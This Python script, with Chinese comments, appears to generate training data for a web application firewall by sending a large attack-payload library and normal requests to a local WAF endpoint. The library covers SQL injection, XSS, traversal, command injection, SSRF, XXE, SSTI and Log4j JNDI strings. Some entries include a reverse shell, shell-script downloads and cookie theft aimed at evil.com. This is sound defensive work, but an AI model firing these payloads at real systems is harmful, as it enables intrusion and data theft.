"""
payload_generator.py — WAF 训练数据生成器。

用大量攻击 payload 和正常请求冲击 WAF，产出高质量训练数据。
支持多种攻击类型、编码变体、随机 IP 轮换。

用法:
    # 确保 WAF 已加白名单（否则会被拦截）
    curl -X POST http://localhost:5800/api/ips \
      -H "Content-Type: application/json" \
      -d '{"cidr":"127.0.0.1/32","type":"allow","action":"add"}'

    # 生成 1000 条攻击 + 200 条正常
    python scripts/payload_generator.py --count 1000 --normal-ratio 0.2

    # 仅生成攻击
    python scripts/payload_generator.py --count 500 --attack-only

    # 生成后查看训练缓存
    python scripts/collect_and_retrain.py --collect
"""
import os, sys, json, random, time, urllib.request, urllib.parse
from typing import List, Tuple

# ─── 配置 ──────────────────────────────────────────────────────────

TARGET = 'http://localhost:5800/api/decide'
WHITELISTED_IP = '127.0.0.1'  # 需要提前加到白名单

# ─── Payload 库 ────────────────────────────────────────────────────

PAYLOADS = {
    'sqli': [
        # 基础注入
        "id=1' OR '1'='1",
        "id=1\" OR \"1\"=\"1",
        "id=1 OR 1=1",
        "id=1' AND '1'='1",
        "username=admin'--",
        "password=' OR 1=1--",
        "id=1 UNION SELECT * FROM users",
        "id=1 UNION SELECT 1,2,3,4,5",
        "id=1 UNION ALL SELECT NULL,NULL,NULL--",
        # 注释绕过
        "id=1'/**/OR/**/'1'='1",
        "id=1'/*!OR*/'1'='1",
        "id=1'-- -",
        "id=1'#",
        "id=1'/*",
        # 编码绕过
        "id=1%27%20OR%20%271%27=%271",
        "id=1%2527%2520OR%2520%25271%2527%253D%25271",
        "id=1'+unIoN+SeLeCt+1,2,3--",
        # 时间盲注
        "id=1 AND SLEEP(5)",
        "id=1 OR SLEEP(3)",
        "id=1 AND BENCHMARK(10000000,MD5(1))",
        "id=1 AND pg_sleep(3)",
        "id=1' AND WAITFOR DELAY '0:0:5'--",
        # 报错注入
        "id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))",
        "id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)",
        # 堆叠查询
        "id=1; DROP TABLE users--",
        "id=1'; EXEC xp_cmdshell('whoami')--",
        # 系统表
        "id=1 AND 1=2 UNION SELECT table_name,1 FROM information_schema.tables",
        "id=1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables",
        # NoSQL
        "id[$ne]=1",
        "id[$gt]=1",
        "id[$regex]=.*",
        "id[$where]=1==1",
        # Order/Group by
        "id=1 ORDER BY 10--",
        "id=1 GROUP BY 10--",
        "id=1 HAVING 1=1--",
    ],
    'xss': [
        # 基础 XSS
        '<script>alert(1)</script>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<script>alert(document.cookie)</script>',
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        # 事件处理器
        '<body onload=alert(1)>',
        '<input onfocus=alert(1)>',
        '<select onfocus=alert(1)>',
        '<textarea onfocus=alert(1)>',
        '<keygen onfocus=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<details ontoggle=alert(1)>',
        # 伪协议
        'javascript:alert(1)',
        '<a href=javascript:alert(1)>click</a>',
        '<iframe src=javascript:alert(1)>',
        '<iframe src=x onload=alert(1)>',
        # 编码绕过
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        # 多态 XSS
        '<img src=x:prompt(1)>',
        '<img src=x onerror=\u0061lert(1)>',
        '<object data=javascript:alert(1)>',
        '<style onload=alert(1)>',
        # 存储型 XSS 模拟
        '<script>fetch(\"http://evil.com/steal?c=\"+document.cookie)</script>',
        '<img src=x onerror=eval(atob(\"YWxlcnQoMSk=\"))>',
    ],
    'traversal': [
        'file=../../../etc/passwd',
        'file=../../../../etc/shadow',
        'file=../../../etc/hosts',
        'file=../../../proc/self/environ',
        'file=..\\..\\..\\windows\\win.ini',
        'file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
        'file=....//....//....//etc/passwd',
        'file=..\\../..\\../..\\../etc/passwd',
        'file=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/passwd',
        'file=..%252f..%252f..%252fetc%252fpasswd',
        'file=..%c0%af..%c0%af..%c0%afetc/passwd',
        'file=../../../WEB-INF/web.xml',
        'file=../../../META-INF/MANIFEST.MF',
        'file=php://filter/convert.base64-encode/resource=index.php',
        'file=php://filter/read=convert.base64-encode/resource=config',
        'file=expect://id',
        'file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==',
    ],
    'cmdi': [
        'host=8.8.8.8;id',
        'host=8.8.8.8|id',
        'host=8.8.8.8`id`',
        'host=8.8.8.8$(id)',
        'host=8.8.8.8|whoami',
        'host=8.8.8.8|cat /etc/passwd',
        'host=8.8.8.8;cat /etc/passwd',
        'cmd=ping -c 10 8.8.8.8',
        'cmd=nslookup attacker.com',
        'cmd=wget http://evil.com/shell.sh',
        'cmd=curl http://evil.com/shell.sh -o /tmp/sh',
        'cmd=bash -i >& /dev/tcp/evil.com/4444 0>&1',
        'cmd=python -c "import socket,subprocess;s=socket.socket();s.connect((\"evil.com\",4444))"',
        'cmd=powershell -enc aQBkAA==',
        'cmd=php -r "system(\'id\');"',
        'cmd=perl -e "system(\'id\')"',
        'cmd=ruby -e "exec(\'id\')"',
    ],
    'ssrf': [
        'url=http://127.0.0.1:22',
        'url=http://127.0.0.1:80',
        'url=http://127.0.0.1:3306',
        'url=http://127.0.0.1:6379',
        'url=http://localhost:8080',
        'url=http://169.254.169.254/latest/meta-data/',
        'url=http://metadata.google.internal',
        'url=http://100.100.100.200/latest/meta-data/',
        'url=http://192.168.1.1/admin',
        'url=http://10.0.0.1:443',
        'url=file:///etc/passwd',
        'url=gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
        'url=dict://localhost:6379/info',
        'url=http://instance-data/latest/meta-data/',
    ],
    'xxe': [
        '<?xml version="1.0"?><!DOCTYPE foo><foo>bar</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com"> %xxe;]>',
        '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>',
    ],
    'ssti': [
        'name={{7*7}}',
        'name={{7*\'7\'}}',
        'name={{config}}',
        'name={{self}}',
        'name={{request}}',
        'name={{__class__}}',
        'name={{__class__.__base__}}',
        'name={{__class__.__mro__[1].__subclasses__()}}',
        'name={{''.__class__.__mro__[1].__subclasses__()}}',
        'name=${7*7}',
        'name=${class.forName("java.lang.Runtime")}',
        'name=${7*7}',
        'name=#{7*7}',
        'name=<%= 7*7 %>',
    ],
    'log4j': [
        'x=${jndi:ldap://evil.com/a}',
        'x=${jndi:rmi://evil.com/a}',
        'x=${jndi:dns://evil.com/a}',
        'x=${jndi:ldap://127.0.0.1:1389/a}',
        'x=${${lower:j}ndi:ldap://evil.com/a}',
        'x=${::-j}ndi:ldap://evil.com/a}',
    ],
    'scanner': [
        '/.env',
        '/admin.php',
        '/wp-admin',
        '/wp-config.php',
        '/backup.sql',
        '/robots.txt',
        '/.git/config',
        '/.svn/entries',
        '/phpinfo.php',
        '/server-status',
        '/console',
        '/actuator/health',
        '/actuator/env',
        '/actuator/dump',
        '/swagger-ui.html',
        '/api-docs',
        '/phpmyadmin',
        '/manager/html',
        '/debug',
        '/trace',
    ],
    'upload': [
        'shell.php.jpg',
        'shell.php.png',
        'shell.asp.jpg',
        'shell.aspx;.jpg',
        'file.php.',
        'file.phtml',
        'file.shtml',
        'file.php5',
        'file.php%00.jpg',
        'file.php\\x00.jpg',
    ],
    'crlf': [
        '%0d%0aX-Custom:%20injected',
        '%0d%0a%0d%0a<script>alert(1)</script>',
        '%0aX-Custom:%20injected',
        '%0d%0aSet-Cookie:%20session=hijacked',
    ],
}

NORMAL_PATHS = [
    '/', '/api/user/profile', '/api/products', '/api/product/1',
    '/api/search?q=phone', '/api/search?q=laptop', '/api/cart',
    '/api/checkout', '/api/order', '/static/styles.css',
    '/static/app.js', '/static/logo.png', '/about', '/contact', '/help',
    '/api/user/login', '/api/user/logout', '/api/user/register',
    '/api/product/2', '/api/product/3', '/api/categories',
    '/api/category/1/products', '/api/recommendations',
]

NORMAL_BODIES = [
    '',
    'username=user&password=pass',
    'email=test@example.com',
    '{"id": 123, "quantity": 1}',
    'search=phone&page=1',
    '{"name": "test", "price": 100}',
]


# ─── 生成器 ────────────────────────────────────────────────────────

def send_request(method: str, path: str, body: str = '',
                 ip: str = None, headers: dict = None) -> dict:
    """向 WAF 发送一条请求并返回结果。"""
    payload = {
        'method': method,
        'path': path,
        'query': body if method == 'GET' else '',
        'body': body if method != 'GET' else '',
        'ip': ip or WHITELISTED_IP,
        'headers': headers or {'User-Agent': 'Mozilla/5.0'},
    }
    try:
        req = urllib.request.Request(TARGET,
            data=json.dumps(payload).encode(),
            headers={'Content-Type': 'application/json'},
        )
        resp = json.loads(urllib.request.urlopen(req, timeout=10).read())
        return resp
    except Exception as e:
        return {'error': str(e)}


def generate_attacks(count: int = 1000) -> List[dict]:
    """生成攻击请求。"""
    samples = []
    attack_types = list(PAYLOADS.keys())
    # 让扫描器路径占比低一些（路径类容易重复）
    weights = [0.18, 0.15, 0.12, 0.12, 0.10, 0.08, 0.08, 0.05, 0.05, 0.04, 0.03]

    for i in range(count):
        atk_type = random.choices(attack_types, weights=weights, k=1)[0]
        payload = random.choice(PAYLOADS[atk_type])

        if atk_type == 'scanner':
            # 扫描器是路径探测
            method = 'GET'
            path = payload
            body = ''
        elif atk_type in ('xxe', 'upload'):
            method = 'POST'
            path = random.choice(['/api/xml', '/api/upload', '/api/import', '/api/data'])
            body = payload
        elif atk_type in ('xss',):
            method = random.choices(['GET', 'POST'], [0.3, 0.7])[0]
            path = random.choice(['/api/comment', '/api/feedback', '/api/profile', '/search'])
            body = f'content={urllib.parse.quote(payload)}'
        else:
            method = random.choices(['GET', 'POST'], [0.7, 0.3])[0]
            path = random.choice([
                '/api/user/login', '/api/search', '/api/data',
                '/api/ping', '/api/fetch', '/api/query',
                '/api/test', '/api/exec', '/api/proxy',
            ])
            body = payload

        # 随机 IP（用 whitelisted_ip 确保不被封）
        ip = f'{random.randint(10,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'

        result = send_request(method, path, body, ip=WHITELISTED_IP)

        samples.append({
            'type': atk_type,
            'method': method,
            'path': path,
            'payload': payload[:60],
            'action': result.get('action', '?'),
            'source': result.get('source', '?'),
        })

        if (i + 1) % 100 == 0:
            print(f'  [{i+1}/{count}] {atk_type}: {result.get("action","?")}')

    return samples


def generate_normal(count: int = 200) -> List[dict]:
    """生成正常请求。"""
    samples = []

    for i in range(count):
        method = random.choices(['GET', 'POST'], [0.8, 0.2])[0]
        path = random.choice(NORMAL_PATHS)
        body = random.choice(NORMAL_BODIES) if method == 'POST' else ''
        ip = f'{random.randint(10,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'

        result = send_request(method, path, body, ip=WHITELISTED_IP)

        samples.append({
            'type': 'normal',
            'method': method,
            'path': path,
            'action': result.get('action', '?'),
        })

        if (i + 1) % 50 == 0:
            print(f'  normal [{i+1}/{count}]: {result.get("action","?")}')

    return samples


def print_stats(samples: List[dict]):
    """打印生成统计。"""
    from collections import Counter

    total = len(samples)
    by_type = Counter(s['type'] for s in samples)
    by_action = Counter(s['action'] for s in samples)
    by_source = Counter(s.get('source', '?') for s in samples)

    print(f'\n=== 生成统计 ===')
    print(f'总请求: {total}')
    print(f'Action: {dict(by_action)}')
    print(f'Source: {dict(by_source)}')
    print(f'\n按类型:')
    for t, c in by_type.most_common():
        blocked = sum(1 for s in samples if s['type'] == t and s['action'] == 'BLOCK')
        print(f'  {t:<12s} {c:>4d}  BLOCK={blocked:>4d} ({blocked/max(c,1)*100:.0f}%)')
    print()


# ═══════════════════════════════════════════════════════════════════
# 主入口
# ═══════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='WAF 训练数据生成器')
    parser.add_argument('--count', type=int, default=500,
                        help='攻击请求数量')
    parser.add_argument('--normal-ratio', type=float, default=0.2,
                        help='正常请求占比')
    parser.add_argument('--attack-only', action='store_true',
                        help='仅生成攻击')
    args = parser.parse_args()

    # 先检查 WAF 是否可达
    try:
        test = send_request('GET', '/', ip=WHITELISTED_IP)
        if 'error' in test:
            print(f'[!] WAF 不可达: {test["error"]}')
            sys.exit(1)
        print(f'[+] WAF 可达: {TARGET}')
        print(f'[+] 白名单 IP: {WHITELISTED_IP}')
        print(f'[!] 确认已在 WAF 白名单: curl ... -d \'{{"cidr":"{WHITELISTED_IP}/32","type":"allow","action":"add"}}\'')
        print()
    except:
        print(f'[!] WAF 不可达: {TARGET}')
        sys.exit(1)

    all_samples = []

    # 生成攻击
    print(f'生成 {args.count} 条攻击请求...')
    attacks = generate_attacks(args.count)
    all_samples.extend(attacks)

    # 生成正常流量
    if not args.attack_only:
        normal_count = max(20, int(args.count * args.normal_ratio))
        print(f'\n生成 {normal_count} 条正常请求...')
        normals = generate_normal(normal_count)
        all_samples.extend(normals)

    print_stats(all_samples)

    print(f'\n[+] 数据已写入 WAF 训练缓存 (data/collected/buffer.jsonl)')
    print(f'[+] 用以下命令查看: python scripts/collect_and_retrain.py --collect')
    print(f'[+] 数据积累足够后重训练: python scripts/collect_and_retrain.py --retrain')
